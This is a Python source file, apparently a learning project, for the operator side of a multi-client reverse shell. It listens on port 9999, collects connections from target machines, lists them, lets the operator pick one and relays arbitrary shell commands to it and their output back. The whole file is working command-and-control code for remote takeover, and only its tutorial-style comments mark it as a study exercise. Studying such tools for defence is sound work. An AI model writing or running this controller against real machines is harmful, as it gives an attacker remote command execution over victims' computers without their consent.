# Project name: Reverse Shell
# Description: The Reverse Shell project is a network-based application that allows a remote machine to gain command-line access to a target machine (client) through a reverse shell connection.

import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
# First thread will listen and accept connections from different clients
# Second thread will send commands to an already connected client

# For threading, we will create 3 functions:
# 1. Create worker threads:
#     - Use a 'for' loop
#     - Create threads using t = threading.Thread()
#     - Assign t.daemon = True
#     - Start the thread using t.start()
# 2. Store jobs in QUEUE because threads look for jobs in a queue and not in lists
# 3. Create a work function and get the queue
#     - If the job number in queue is 1 then handle connections
#     - If the job number in queue is 2 then send commands



JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []

# Create a Socket (Connect two computers)
def create_socket():
    try:
        global host
        global port
        global s #Socket
        host  = ""    
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port " + str(port))
        s.bind((host,port))
        s.listen(5) # No. of bad connections it can tolerate
    
    except socket.error as msg:
        print("Socket binding error " + str(msg) + "\n" + "Retrying...")
        bind_socket()
        
# Handling connections from multiple clients and saving in the lists
def accepting_connection():
    # Closing previous connections when server.py file is restarted
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # It prevents the timeout of connections
            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established! | " + "IP: " + address[0] + " | Port: " + str(address[1]))
        
        except:
            print("Error accepting connections")

# See all the clients, select a client, and than send commands to the connected client

# Interective prompt for sending commands
# MYSHELL> list
# 0 Friend-A
# 1 Friend-B
# 2 Friend-C
def start_MYSHELL():
    print("\n")
    while True: 
        cmd = input('MYSHELL> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
            else:
                print("Invalid choice")
        elif cmd == 'quit':
            print("Shutting down the server...")
            for conn in all_connections:
                conn.close()  # Close all active connections
            s.close()  # Close the server socket
            sys.exit(0)  # Exit the program
        elif 'delete' in cmd:
            target = int(cmd.replace('delete ',''))
            if target<len(all_connections):
                conn = all_connections[target];
                conn.close()
        else:
            print("Command not recognized")

# Display all current active connections with the client
def list_connections():
    results = ''
    print("\n----- CLIENTS -----\n")
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480) # Will throw an error if nothing is received
        except:
            del all_connections[i]
            del all_address[i]
            continue
        
        results = str(i) + "    " + str(all_address[i][0]) + "    " + str(all_address[i][1])
        print(results)


# Selecting the target
def get_target(cmd):
    try:
        target = int(cmd.replace('select ',''))
        conn = all_connections[target]
        print("You are now connected to: "+str(all_address[target][0]))
        print(str(all_address[target][0]) + '>', end="")
        return conn
    except:
        print("Selection not valid")
        return None

# Send commands to client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd=='quit':
                break
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response,end="")
        except:
            print("Error sending commands")
            break    

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # It tells the program that if whenever the program ends, the thread also ends
        t.start()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)   
    queue.join()

# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            start_MYSHELL()

        queue.task_done()


create_workers()
create_jobs()

# nano server.py -> to create a  file, cat server.py -> to read content of that file -> Some basic cmd commands